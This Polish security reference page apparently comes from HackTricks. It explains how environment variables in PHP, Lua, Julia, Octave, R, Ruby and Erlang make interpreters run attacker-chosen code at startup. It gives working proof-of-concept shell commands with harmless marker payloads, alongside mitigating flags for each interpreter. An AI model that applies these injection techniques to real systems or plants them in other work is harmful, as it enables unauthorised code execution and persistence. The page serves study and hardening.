# Wstrzykiwanie kodu podczas uruchamiania interpreterów macOS za pomocą zmiennych środowiskowych

{{#include ../../../banners/hacktricks-training.md}}

Te techniki zależne od środowiska uruchomieniowego wykorzystują dziedziczone zmienne środowiskowe do wyboru konfiguracji startowej, wstępnego załadowania kodu lub przekazania flag VM przed uruchomieniem właściwego obciążenia. Niektóre warianty korzystają z plików; Lua i Erlang obsługują również wykonywanie kodu wbudowanego.

## Konfiguracja startowa PHP

### `PHPRC` / `PHP_INI_SCAN_DIR` i `auto_prepend_file`

PHP CLI i CGI odczytują konfigurację przy każdym uruchomieniu. `PHPRC` może wskazywać plik `php.ini`, który jest dostępny do odczytu przez atakującego, a `PHP_INI_SCAN_DIR` może przekierować katalog skanowany w poszukiwaniu dodatkowych plików `.ini`. Dyrektywa `auto_prepend_file` sprawia, że PHP analizuje plik przed żądanym skryptem, dzięki czemu to połączenie umożliwia wykonanie kodu podczas uruchamiania.<sup>[[1]](#references)[[2]](#references)</sup>

```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```

Alternatywą jest katalog zawierający plik `.ini`:

```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```

Opcja `-n` ignoruje `php.ini`; jawna, zaufana ścieżka podana przez `-c` ma pierwszeństwo przed `PHPRC`. Pamiętaj, że długotrwały serwerowy SAPI zwykle odczytuje konfigurację podczas uruchamiania serwera WWW, natomiast CLI i CGI robią to przy każdym wywołaniu.<sup>[[1]](#references)</sup>

## Kod startowy Lua

### `LUA_INIT`

Przed przetworzeniem opcji wiersza poleceń lub skryptu docelowego samodzielny interpreter Lua wykonuje `LUA_INIT_<major>_<minor>` albo — jeśli zmienna z numerem wersji nie jest ustawiona — `LUA_INIT`. Wartość zaczynająca się od `@` wskazuje plik; każda inna wartość jest bezpośrednio interpretowana jako kod Lua. Umożliwia to wykonanie kodu startowego zarówno z pliku, jak i bez pliku.<sup>[[3]](#references)</sup>

```bash
# File-backed
echo 'os.execute("touch /tmp/lua-init-executed")' >/tmp/lua-init.lua
LUA_INIT_5_4=@/tmp/lua-init.lua lua victim.lua

# Fileless
LUA_INIT='os.execute("touch /tmp/lua-inline-executed")' lua victim.lua
```

Dokładna nazwa zależy od wersji interpretera, na przykład `LUA_INIT_5_4`. `lua -E` ignoruje wszystkie zmienne środowiskowe, w tym kod startowy i ścieżki modułów Lua.

## Depot startowy Julii

### `JULIA_DEPOT_PATH` i `startup.jl`

Julia zwykle uruchamia podczas startu plik `config/startup.jl` z pierwszego depotu. `JULIA_DEPOT_PATH` określa listę depotów, więc wskazanie drzewa dostępnego do odczytu przez atakującego przekierowuje automatycznie ładowany plik startowy.<sup>[[4]](#references)[[5]](#references)</sup>

```bash
mkdir -p /tmp/julia-depot/config
echo 'run(`touch /tmp/julia-startup-executed`)' >/tmp/julia-depot/config/startup.jl

# A trailing empty entry expands to Julia's default depots.
JULIA_DEPOT_PATH=/tmp/julia-depot: julia victim.jl
```

Separator na końcu jest przydatny, gdy ofiara nadal potrzebuje swoich standardowych pakietów. `julia --startup-file=no` wyłącza ten plik startowy. Wyczyść zmienną przed uruchomieniem, ponieważ kontroluje ona również rejestry pakietów, środowiska, pamięci podręczne i lokalizacje ładowania kodu.

## Pliki startowe GNU Octave

### `OCTAVE_SITE_INITFILE` / `OCTAVE_VERSION_INITFILE`

GNU Octave podczas uruchamiania wykonuje kilka plików zawierających poprawne polecenia Octave. `OCTAVE_SITE_INITFILE` zastępuje plik startowy dla całej witryny, a `OCTAVE_VERSION_INITFILE` zastępuje plik właściwy dla danej wersji, dzięki czemu każda z tych zmiennych może przekierować automatyczne wykonanie do pliku, który atakujący może odczytać.<sup>[[6]](#references)</sup>

```bash
cat >/tmp/octave-startup.m <<'OCTAVE'
system('touch /tmp/octave-startup-executed');
OCTAVE

OCTAVE_SITE_INITFILE=/tmp/octave-startup.m octave-cli --quiet victim.m
```

`--no-init-file` pomija tylko pliki użytkownika, takie jak `~/.octaverc`; **nie** zatrzymuje nadpisania pliku site-file opisanego powyżej. Użyj `--no-site-file` dla plików site-file albo `--norc` / `-f`, aby wyłączyć wszystkie pliki startowe.<sup>[[7]](#references)</sup>

## Profile startowe R i ładowanie pakietów

### `R_PROFILE_USER` / `R_PROFILE`

Podczas uruchamiania R wykonuje pliki profili site i użytkownika zawierające kod R. `R_PROFILE` wskazuje profil site, a `R_PROFILE_USER` profil użytkownika, umożliwiając odziedziczonemu środowisku przekierowanie dowolnego z tych odwołań do pliku dostępnego dla atakującego.<sup>[[8]](#references)</sup>

```bash
echo 'file.create("/tmp/r-profile-executed")' >/tmp/attacker.Rprofile
R_PROFILE_USER=/tmp/attacker.Rprofile Rscript victim.R
```

`--no-init-file` pomija profil użytkownika, `--no-site-file` pomija profil site, a `--vanilla` obejmuje obie te ochrony. R najpierw przetwarza pliki środowiskowe wskazane przez `R_ENVIRON` i `R_ENVIRON_USER`, ale te pliki służą tylko do ustawiania zmiennych; zmienne profilu stanowią bezpośredni mechanizm wykonywania dowolnego kodu.

### `R_DEFAULT_PACKAGES` / `R_SCRIPT_DEFAULT_PACKAGES` i ścieżki bibliotek

Podczas uruchamiania R dołącza pakiety rozdzielone przecinkami, określone przez `R_DEFAULT_PACKAGES`. `Rscript` daje pierwszeństwo `R_SCRIPT_DEFAULT_PACKAGES`. Połączenie którejkolwiek z tych zmiennych z `R_LIBS`, `R_LIBS_USER` lub `R_LIBS_SITE` może spowodować, że R znajdzie i załaduje zainstalowany pakiet kontrolowany przez atakującego; jego hook `.onLoad` lub `.onAttach` wykonuje się automatycznie.<sup>[[8]](#references)[[9]](#references)</sup>

```bash
# Assume an installed package named htpayload exists below /tmp/r-library.
R_LIBS_USER=/tmp/r-library \
R_DEFAULT_PACKAGES=htpayload \
R --no-save --no-restore --silent

R_LIBS_USER=/tmp/r-library \
R_SCRIPT_DEFAULT_PACKAGES=htpayload \
Rscript victim.R
```

Wymaga to poprawnie zainstalowanego pakietu R, a nie tylko luźnego pliku `.R`. `--vanilla` nie usuwa bezpośrednio odziedziczonych zmiennych, dlatego zaufany wrapper musi usunąć lub zastąpić zmienne określające domyślne pakiety i ścieżkę bibliotek, a także wyłączyć pliki profilu.

## Opcje loadera Ruby

### RUBYOPT

Ruby analizuje obsługiwane przełączniki wiersza poleceń ze zmiennej środowiskowej `RUBYOPT` przed uruchomieniem skryptu. Ruby odrzuca wykonywanie kodu przez `-e` w `RUBYOPT`, ale `-I` może dodać katalog na początku ścieżki wyszukiwania bibliotek, a `-r` może załadować bibliotekę. Proces uruchamiający Ruby ze zmiennymi środowiskowymi kontrolowanymi przez atakującego można zatem nakłonić do załadowania kodu Ruby kontrolowanego przez atakującego.<sup>[[10]](#references)</sup>

Utwórz `/tmp/inject.rb`:

```ruby:inject.rb
puts `whoami`
```

Utwórz nieszkodliwy skrypt Ruby, taki jak `hello.rb`:

```ruby:hello.rb
puts 'Hello, World!'
```

Uruchom go z kontrolowaną wartością `RUBYOPT`:

```bash
RUBYOPT="-I/tmp -rinject" ruby hello.rb
```

Aby wyłączyć to zachowanie, przekaż `--disable=rubyopt` (lub `--disable-rubyopt`) **przed** nazwą skryptu:<sup>[[10]](#references)</sup>

```bash
RUBYOPT="-I/tmp -rinject" ruby --disable=rubyopt hello.rb
```

Opcja zapisana po `hello.rb` jest przekazywana skryptowi w `ARGV`; nie wyłącza wcześniejszego przetwarzania `RUBYOPT` przez Ruby.<sup>[[10]](#references)</sup>

```bash
# This still loads /tmp/inject.rb because --disable-rubyopt is an argument to hello.rb.
RUBYOPT="-I/tmp -rinject" ruby hello.rb --disable-rubyopt
```

### RUBYLIB

Zamiast dodawać katalog ładowania na początku za pomocą `-I` w `RUBYOPT`, osobna zmienna środowiskowa `RUBYLIB` dodaje katalogi do `$LOAD_PATH` w Ruby. W połączeniu z `RUBYOPT=-r<module>` ładuje kod atakującego bez konieczności używania `-I` w `RUBYOPT`:<sup>[[10]](#references)</sup>

```bash
echo "puts \`whoami\`" > /tmp/inject.rb
RUBYLIB=/tmp RUBYOPT=-rinject ruby hello.rb
```

## Flagi VM Erlang i Elixir

### `ERL_AFLAGS`, `ERL_FLAGS` i `ERL_ZFLAGS`

Program uruchamiający `erl` dodaje `ERL_AFLAGS` na początku wiersza poleceń, a `ERL_FLAGS` / `ERL_ZFLAGS` na jego końcu. Ponieważ `-eval` oblicza wyrażenie Erlang podczas inicjalizacji VM, te zmienne mogą umożliwić bezplikowe wykonanie kodu przed uruchomieniem docelowego obciążenia.<sup>[[11]](#references)</sup>

```bash
ERL_AFLAGS="-noshell -eval 'file:write_file(\"/tmp/erl-aflags-executed\", <<\"ok\">>).' -s init stop" erl
```

Elixir, Mix, Phoenix i wiele wydań Elixir ostatecznie uruchamiają Erlang VM i mogą dziedziczyć te flagi. Sprawdź dokładnie wrapper wydania: może on przebudowywać lub czyścić argumenty VM, podczas gdy niektóre narzędzia jawnie obsługują `ERL_AFLAGS`, `ERL_ZFLAGS` lub `ELIXIR_ERL_OPTIONS`.<sup>[[12]](#references)</sup>

W przeciwieństwie do większości technik opartych na plikach payload `-eval` nie wymaga pliku kontrolowanego przez atakującego. Zaufany wrapper powinien wyczyścić wszystkie trzy zmienne flag Erlang (a w przypadku Elixir także `ELIXIR_ERL_OPTIONS`) przed uruchomieniem środowiska wykonawczego; nie próbuj tworzyć allowlisty poszczególnych flag VM, chyba że w pełni rozumiesz parser i kolejność przetwarzania.

## References

- [1] [Plik konfiguracyjny PHP](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
- [3] [Samodzielny interpreter Lua 5.4](https://www.lua.org/manual/5.4/manual.html#7)
- [4] [Interfejs wiersza poleceń Julii: plik startowy](https://docs.julialang.org/en/v1/manual/command-line-interface/#Startup-file)
- [5] [Zmienne środowiskowe Julii: `JULIA_DEPOT_PATH`](https://docs.julialang.org/en/v1/manual/environment-variables/#JULIA_DEPOT_PATH)
- [6] [Pliki startowe GNU Octave](https://docs.octave.org/latest/Startup-Files.html)
- [7] [Opcje wiersza poleceń GNU Octave](https://docs.octave.org/latest/Command-Line-Options.html)
- [8] [Inicjalizacja na początku sesji R](https://stat.ethz.ch/R-manual/R-devel/library/base/html/Startup.html)
- [9] [Instalacja i administracja R: pakiety dodatkowe](https://stat.ethz.ch/CRAN/doc/manuals/r-release/R-admin.html)
- [10] [Dokumentacja Ruby — opcje wiersza poleceń Ruby](https://ruby-doc.org/3.4/ruby/options_md.html)
- [11] [Polecenie `erl` i zmienne środowiskowe](https://www.erlang.org/doc/apps/erts/erl_cmd.html)
- [12] [Wydania Elixir i opcje środowiska VM](https://hexdocs.pm/elixir/releases.html#operating-system-scripts)
{{#include ../../../banners/hacktricks-training.md}}
